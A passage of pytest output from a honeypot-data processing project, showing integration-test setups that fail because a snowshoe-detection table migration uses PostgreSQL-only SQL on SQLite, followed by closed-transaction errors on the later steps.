            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
INFO     cowrieprocessor.db.migrations:migrations.py:725 Snowshoe detection schema migration (v8) completed successfully
___ ERROR at setup of TestSSHKeyAnalyticsIntegration.test_campaign_detection ___

    @pytest.fixture
    def test_db() -> None:
        """Create a test database with SSH key intelligence schema."""
        engine = create_engine("sqlite:///:memory:", echo=False)
    
        # Apply migrations to create all tables including SSH key intelligence
>       apply_migrations(engine)

/home/speterson/cowrieprocessor/tests/integration/test_ssh_key_enrichment.py:30: 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
/home/speterson/cowrieprocessor/cowrieprocessor/db/migrations.py:182: in apply_migrations
    _set_schema_version(connection, 8)
/home/speterson/cowrieprocessor/cowrieprocessor/db/migrations.py:132: in _set_schema_version
    result = connection.execute(stmt)
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1419: in execute
    return meth(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/sql/elements.py:526: in _execute_on_connection
    return connection._execute_clauseelement(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1641: in _execute_clauseelement
    ret = self._execute_context(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1836: in _execute_context
    TransactionalContext._trans_ctx_check(self)
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 

cls = <class 'sqlalchemy.engine.util.TransactionalContext'>
subject = <sqlalchemy.engine.base.Connection object at 0x7756b26f1b70>

    @classmethod
    def _trans_ctx_check(cls, subject: _TConsSubject) -> None:
        trans_context = subject._trans_context_manager
        if trans_context:
            if not trans_context._transaction_is_active():
>               raise exc.InvalidRequestError(
                    "Can't operate on closed transaction inside context "
                    "manager.  Please complete the context manager "
                    "before emitting further commands."
                )
E               sqlalchemy.exc.InvalidRequestError: Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.

/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/util.py:111: InvalidRequestError
---------------------------- Captured stdout setup -----------------------------
2025-10-18 17:41:44,524:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
2025-10-18 17:41:44,524:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
2025-10-18 17:41:44,525:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
2025-10-18 17:41:44,525:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
2025-10-18 17:41:44,531:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 17:41:44,531:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 17:41:44,532:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 17:41:44,532:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 17:41:44,533:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 17:41:44,533:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 17:41:44,535:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 17:41:44,535:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 17:41:44,536:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 17:41:44,536:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 17:41:44,537:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 17:41:44,537:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 17:41:44,538:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 17:41:44,538:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 17:41:44,539:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 17:41:44,539:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 17:41:44,541:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 17:41:44,541:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 17:41:44,541:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 17:41:44,541:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 17:41:44,542:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 17:41:44,542:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 17:41:44,543:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 17:41:44,543:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 17:41:44,544:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:41:44,544:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:41:44,544:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:41:44,544:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:41:44,548:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:41:44,548:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:41:44,548:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:41:44,548:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:41:44,549:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:41:44,549:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:41:44,549:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
2025-10-18 17:41:44,549:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
------------------------------ Captured log setup ------------------------------
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Set default source_generation values
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Create unique index on raw_events
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate session_id from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate event_type from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate event_timestamp from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for files.vt_malicious will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:418 Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
INFO     cowrieprocessor.db.migrations:migrations.py:683 Starting snowshoe detection schema migration (v8)
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
INFO     cowrieprocessor.db.migrations:migrations.py:725 Snowshoe detection schema migration (v8) completed successfully
_ ERROR at setup of TestSSHKeyAnalyticsIntegration.test_key_timeline_analysis __

    @pytest.fixture
    def test_db() -> None:
        """Create a test database with SSH key intelligence schema."""
        engine = create_engine("sqlite:///:memory:", echo=False)
    
        # Apply migrations to create all tables including SSH key intelligence
>       apply_migrations(engine)

/home/speterson/cowrieprocessor/tests/integration/test_ssh_key_enrichment.py:30: 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
/home/speterson/cowrieprocessor/cowrieprocessor/db/migrations.py:182: in apply_migrations
    _set_schema_version(connection, 8)
/home/speterson/cowrieprocessor/cowrieprocessor/db/migrations.py:132: in _set_schema_version
    result = connection.execute(stmt)
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1419: in execute
    return meth(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/sql/elements.py:526: in _execute_on_connection
    return connection._execute_clauseelement(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1641: in _execute_clauseelement
    ret = self._execute_context(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1836: in _execute_context
    TransactionalContext._trans_ctx_check(self)
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 

cls = <class 'sqlalchemy.engine.util.TransactionalContext'>
subject = <sqlalchemy.engine.base.Connection object at 0x7756b269edd0>

    @classmethod
    def _trans_ctx_check(cls, subject: _TConsSubject) -> None:
        trans_context = subject._trans_context_manager
        if trans_context:
            if not trans_context._transaction_is_active():
>               raise exc.InvalidRequestError(
                    "Can't operate on closed transaction inside context "
                    "manager.  Please complete the context manager "
                    "before emitting further commands."
                )
E               sqlalchemy.exc.InvalidRequestError: Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.

/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/util.py:111: InvalidRequestError
---------------------------- Captured stdout setup -----------------------------
2025-10-18 17:41:44,938:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
2025-10-18 17:41:44,938:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
2025-10-18 17:41:44,939:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
2025-10-18 17:41:44,939:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
2025-10-18 17:41:44,945:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 17:41:44,945:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 17:41:44,946:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 17:41:44,946:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 17:41:44,948:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 17:41:44,948:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 17:41:44,952:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 17:41:44,952:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 17:41:44,954:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 17:41:44,954:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 17:41:44,955:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 17:41:44,955:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 17:41:44,956:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 17:41:44,956:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 17:41:44,960:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 17:41:44,960:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 17:41:44,961:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 17:41:44,961:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 17:41:44,962:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 17:41:44,962:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 17:41:44,963:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 17:41:44,963:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 17:41:44,964:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 17:41:44,964:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 17:41:44,965:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:41:44,965:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:41:44,965:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:41:44,965:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:41:44,968:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:41:44,968:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:41:44,969:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:41:44,969:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:41:44,969:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:41:44,969:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:41:44,970:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
2025-10-18 17:41:44,970:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
------------------------------ Captured log setup ------------------------------
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Set default source_generation values
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Create unique index on raw_events
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate session_id from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate event_type from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate event_timestamp from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for files.vt_malicious will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:418 Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
INFO     cowrieprocessor.db.migrations:migrations.py:683 Starting snowshoe detection schema migration (v8)
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
INFO     cowrieprocessor.db.migrations:migrations.py:725 Snowshoe detection schema migration (v8) completed successfully
